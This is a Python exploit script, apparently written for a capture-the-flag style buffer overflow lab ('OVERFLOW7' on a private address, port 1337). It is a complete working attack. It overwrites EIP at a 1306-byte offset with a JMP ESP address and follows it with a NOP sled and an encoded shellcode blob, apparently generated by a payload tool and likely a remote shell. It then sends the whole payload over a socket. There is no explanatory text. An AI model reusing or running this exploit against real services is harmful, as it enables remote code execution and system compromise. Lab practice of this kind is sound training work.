import struct, socket



host, port = '10.10.243.3', 1337
all_chars = bytearray(range(1,256))

bad_chars = [
b'\x8c',
b'\xae',
b'\xbe',
b'\xfb',
]

for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

def p32(data):
        return struct.pack("<I",data)
shellcode =  b""
shellcode += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x6d\x2c\xe9\x3a\x83\xee\xfc"
shellcode += b"\xe2\xf4\x91\xc4\x6b\x3a\x6d\x2c\x89\xb3\x88"
shellcode += b"\x1d\x29\x5e\xe6\x7c\xd9\xb1\x3f\x20\x62\x68"
shellcode += b"\x79\xa7\x9b\x12\x62\x9b\xa3\x1c\x5c\xd3\x45"
shellcode += b"\x06\x0c\x50\xeb\x16\x4d\xed\x26\x37\x6c\xeb"
shellcode += b"\x0b\xc8\x3f\x7b\x62\x68\x7d\xa7\xa3\x06\xe6"
shellcode += b"\x60\xf8\x42\x8e\x64\xe8\xeb\x3c\xa7\xb0\x1a"
shellcode += b"\x6c\xff\x62\x73\x75\xcf\xd3\x73\xe6\x18\x62"
shellcode += b"\x3b\xbb\x1d\x16\x96\xac\xe3\xe4\x3b\xaa\x14"
shellcode += b"\x09\x4f\x9b\x2f\x94\xc2\x56\x51\xcd\x4f\x89"
shellcode += b"\x74\x62\x62\x49\x2d\x3a\x5c\xe6\x20\xa2\xb1"
shellcode += b"\x35\x30\xe8\xe9\xe6\x28\x62\x3b\xbd\xa5\xad"
shellcode += b"\x1e\x49\x77\xb2\x5b\x34\x76\xb8\xc5\x8d\x73"
shellcode += b"\xb6\x60\xe6\x3e\x02\xb7\x30\x44\xda\x08\x6d"
shellcode += b"\x2c\x81\x4d\x1e\x1e\xb6\x6e\x05\x60\x9e\x1c"
shellcode += b"\x6a\xd3\x3c\x82\xfd\x2d\xe9\x3a\x44\xe8\xbd"
shellcode += b"\x6a\x05\x05\x69\x51\x6d\xd3\x3c\x6a\x3d\x7c"
shellcode += b"\xb9\x7a\x3d\x6c\xb9\x52\x87\x23\x36\xda\x92"
shellcode += b"\xf9\x7e\x50\x68\x44\xe3\x31\x58\x14\x81\x38"
shellcode += b"\x6d\x0f\xc0\xb3\x8b\x46\xf9\x6c\x3a\x44\x70"
shellcode += b"\x9f\x19\x4d\x16\xef\xe8\xec\x9d\x36\x92\x62"
shellcode += b"\xe1\x4f\x81\x44\x19\x8f\xcf\x7a\x16\xef\x05"
shellcode += b"\x4f\x84\x5e\x6d\xa5\x0a\x6d\x3a\x7b\xd8\xcc"
shellcode += b"\x07\x3e\xb0\x6c\x8f\xd1\x8f\xfd\x29\x08\xd5"
shellcode += b"\x3b\x6c\xa1\xad\x1e\x7d\xea\xe9\x7e\x39\x7c"
shellcode += b"\xbf\x6c\x3b\x6a\xbf\x74\x3b\x7a\xba\x6c\x05"
shellcode += b"\x55\x25\x05\xeb\xd3\x3c\xb3\x8d\x62\xbf\x7c"
shellcode += b"\x92\x1c\x81\x32\xea\x31\x89\xc5\xb8\x97\x19"
shellcode += b"\x8f\xcf\x7a\x81\x9c\xf8\x91\x74\xc5\xb8\x10"
shellcode += b"\xef\x46\x67\xac\x12\xda\x18\x29\x52\x7d\x7e"
shellcode += b"\x5e\x86\x50\x6d\x7f\x16\xef"

jmp_esp = p32(0x625011EB)
nop_sled = b'\x90' * 10
command = b'OVERFLOW7 '
length = 1500
new_eip = b'BBBB'
offset = 1306
payload = b''.join([

command,
b'A'*offset,
jmp_esp,
nop_sled,
shellcode,
b'C' * (length - offset - len(jmp_esp) - len(nop_sled) - len(shellcode)),

])



with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
